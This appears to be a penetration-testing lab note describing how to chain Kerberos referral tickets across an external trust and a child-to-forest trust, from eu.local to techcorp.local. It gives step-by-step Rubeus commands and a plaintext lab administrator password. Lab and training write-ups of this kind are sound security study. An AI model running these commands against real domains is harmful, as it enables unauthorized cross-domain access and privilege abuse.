# Methodology
>1. Request a referral TGT as intended from eu.local to us.techcorp.local (external bidirectional trust)
>2. Request a "local" TGT for us.techcorp.local (service realm - us.techcorp.local) since direct access from eu.local to techcorp.local isn't allowed.
>3. Use the local TGT again to gain another referral TGT for techcorp.local from us.techcorp.local (bidirectional child to forest trust).
>4. Finally, use the resultant referral TGT to gain a TGS for a target service on techcorp.local.

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## Rubeus
**Request a TGT for the eu\\administrator user:**
```cmd
Rubeus.exe asktgt /user:administrator /password:0h!DomainDomainOnTheNet /nowrap
```

**Request a referral TGT for us.techcorp.local:**
```cmd
Rubeus.exe asktgs /service:krbtgt/us.techcorp.local /dc:eu-dc.eu.local /nowrap /ticket:
```

**Use the above referral TGT to gain a "local" TGT for us.techcorp.local:**
```cmd
Rubeus.exe asktgs /service:krbtgt/us.techcorp.local /dc:us-dc.us.techcorp.local /targetdomain:us.techcorp.local /nowrap /ticket:
```

**Use the "local" TGT now request another referral TGT for techcorp.local:**
```cmd
Rubeus.exe asktgs /service:krbtgt/techcorp.local /dc:us-dc.us.techcorp.local /targetdomain:us.techcorp.local /nowrap /ticket:<"local" TGT>
```

**Request a usable TGS to gain access onto any target service on techcorp.local:**
```cmd
Rubeus.exe asktgs /service:cifs/techcorp-dc.techcorp.local /dc:techcorpdc.techcorp.local /nowrap /ptt /ticket:
```